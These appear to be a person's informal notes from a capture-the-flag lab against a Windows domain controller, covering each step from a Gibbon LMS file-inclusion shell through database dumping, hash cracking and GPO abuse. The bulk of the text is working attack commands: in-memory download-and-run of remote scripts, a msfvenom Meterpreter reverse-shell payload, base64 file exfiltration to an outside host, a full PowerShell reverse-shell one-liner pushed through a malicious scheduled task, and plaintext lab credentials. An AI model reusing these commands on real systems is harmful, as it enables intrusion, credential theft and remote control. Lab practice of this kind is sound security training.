___


-> this is a domain controller and I got no creds

theres an apache server running on windows on port 80 

theres ssh for windows running on port 22



*local file inclusion with ?q= this is present*
## CVE-2023-34598?




*I think this it*
https://sploitus.com/exploit?id=B9C9A654-821F-5450-BD25-49C6C09C3224




*that worked got a shell as frizz*

whoami
frizz\w.webservice
PS C:\xampp\htdocs\Gibbon-LMS> ls



*local DB creds*

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';


Connect-MariaDB -User "MrGibbonsDB" -Password "MisterGibbs!Parrot!?1" -Database "gibbon" 


ServerAdmin f.frizzle@frizz.htb



frizz\w.webservice



$connection = Connect‑MariaDB `
  -User $User -Password $Password `
  -Server $Server -Port $Port `
  -Database $Database



$connection = Connect‑MariaDB -User "MrGibbonsDB" -Password "MisterGibbs!Parrot!?1" -Server 127.0.0.1 -Port 3306 -Database "gibbon"


Invoke‑MariaDB -Connection $connection -Query 'SELECT * FROM gibbonPerson'




*running scripts in memory*

IEX(New-Object Net.WebClient).downloadString('http://10.10.20.30:8000/myscript.ps1')   `

IEX(IWR http://10.10.20.30:8000/myscript.ps1)   



*upgrading to meterpreter*

$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.20.30 LPORT=9090 -f exe -o evil.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes Saved as: evil.exe   `


msf6 > use exploit/multi/handler msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp msf6 > set LHOST 10.10.20.30 msf6 > set LPORT 9090 msf6 > exploit`


PS > Invoke-WebRequest -URI http://10.10.10.10:8000/myPayload.exe -OutFile .\myPayload.exe   



-u "MrGibbonsDB" -p "MisterGibbs!Parrot!?1" -P 3306 -D "gibbon"


*this is how it needs to run aparently*

```bash
$db   = 'gibbon'
$user = 'MrGibbonsDB'
$pass = 'MisterGibbs!Parrot!?1'

$mysql  = '.\bin\mysql.exe'
$params = '-u', $user, '-p', $pass, '-D', $db

& $mysql @params -e 'SHOW DATABASES'
& $mysql @params -e '...'
```


& $mysql @params -e 'SELECT * FROM gibbonPerson'




.\mysql.exe -u MrGibbonsDB -p"Mis*********" -e "USE gibbon; SELECT * FROM gibbonperson;" -E




*idk why the command just hangs*
./bin/mysql.exe -u MrGibbonsDB -p 'MisterGibbs!Parrot!?1' -e "USE gibbon;SELECT * FROM gibbonPerson;" -E




& cmd /c '.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonPerson;" -E'





*this worked on CMD not powershell!!!!!!!!!!*

.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonPerson;" -E





*dumped this user*

gibbonPersonID: 0000000001
                    title: Ms.
                  surname: Frizzle
                firstName: Fiona
            preferredName: Fiona
             officialName: Fiona Frizzle
         nameInCharacters: 
                   gender: Unspecified
                 username: f.frizzle
           passwordStrong: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
       passwordStrongSalt: /aACFhikmNopqrRTVz2489
       passwordForceReset: N
                   status: Full
                 canLogin: Y
      gibbonRoleIDPrimary: 001
          gibbonRoleIDAll: 001
                      dob: NULL
                    email: f.frizzle@frizz.htb
           emailAlternate: NULL
                image_240: NULL
            lastIPAddress: ::1
            lastTimestamp: 2024-10-29 09:28:59
        lastFailIPAddress: NULL
        lastFailTimestamp: NULL
                failCount: 0







*hashcat command*
hashcat -m 1420 f.frizzle.hash --wordlist ~/Documents/wordlists/rockyou.txt

why tf did it work with 1420 ?? should it not b 1410??? i put the salt at the end wtf




*hashcrack did it so much easier*

067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23




so the format is always HASH:SALT in the file

the modes are how the hash gets computed!!!!!!!!!




so either sha256(salt + password) or sha256(password + salt) 



you need to figure out when the hash is actually computed with one gets put first depends on the application -> research the app that created the hash




f.frizzle
Jenni_Luvs_Magic23



to log in  as f.frizzle need to go through kerberos there is ssh running on the machine 

/etc/krb5.conf needs to be edited to point to the KDC of the domain so ssh can use kerberos

ssh user@pass -K 

also request the TGT with one of the tools





Look for deleted fie in recycle bin  
  
$shell = New-Object -ComObject Shell.Application  
$recycleBin = $shell.Namespace(0xA)  
$recycleBin.items() | Select-Object Name, Path



Restore deleted file  
  
$recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)  
$items = $recycleBin.Items()  
$item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}  
$documentsPath = [Environment]::GetFolderPath("Desktop")  
$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)  
$documents.MoveHere($item)





*more than 1 one to skin a cat*
`   PS > $b64 = [Convert]::ToBase64String((Get-Content -Path .\path\to\someFile.exe -Encoding Byte)) PS > Invoke-WebRequest -URI http://10.10.10.10:9090 -Method POST -Body $b64   `




password in that zip file?

!suBcig@MehTed!R



New-GPO -Name pain | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes




### Advanced usage

[](https://github.com/Hackndo/pyGPOAbuse#advanced-usage)

Reverse shell example

```shell
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" \ 
    -powershell \ 
    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" \ 
    -taskname "Completely Legit Task" \
    -description "Dis is legit, pliz no delete" \ 
    -user
```





.\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' powershell.exe --remote-impersonation --logon-type 3 -r 10.10.14.138:5555


kerbrute password spray feature


this was a brainfuck idk why


